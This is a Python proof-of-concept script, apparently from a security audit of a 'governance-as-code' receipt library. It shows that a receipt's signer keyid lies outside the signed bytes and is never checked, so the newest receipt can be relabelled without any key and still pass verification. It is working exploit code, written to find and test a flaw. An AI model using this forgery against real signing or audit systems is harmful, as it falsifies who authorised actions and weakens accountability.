#!/usr/bin/env python3
"""PoC 10 — No-key forgery of signer attribution on a chain tip.

keyid lives inside the `signatures` list, which is EXCLUDED from the signed
bytes (signed = everything except "signatures"), and verify_receipt never
compares sigs[0]["keyid"] to the actual verification key. The chain commits
to a receipt's signatures via chain_hash — but nothing commits to the TIP's
chain_hash inside the verified set, so the tip's keyid is freely malleable:
an attacker with no private key re-labels who "signed" the newest receipt
and the bundle still verifies PASS / all_links_valid=True. S2.3 / S2.6.
"""
import copy, sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_chain,
                         verify_receipt, keyid, sha256_hex)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]
EXEC = {"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"}

sk, pk = generate_keypair()
r1 = build_receipt(action_id="a-001", subject_name="prod:svc", actor=HUMAN,
                   policy_decision=POL, execution=EXEC, evidence_items=EV,
                   prev_chain_hash="GENESIS", signing_key=sk)

# Attacker (no private key) rewrites the tip's claimed signer identity.
t = copy.deepcopy(r1)
t["signatures"][0]["keyid"] = "deadbeefdeadbeef"
assert t["signatures"][0]["keyid"] != keyid(pk)

v = verify_receipt(t, pk)
c = verify_chain([t], pk)
ok = v.verdict == "PASS" and c["all_links_valid"] is True

print("EXPLOIT-WORKS" if ok else "HELD")
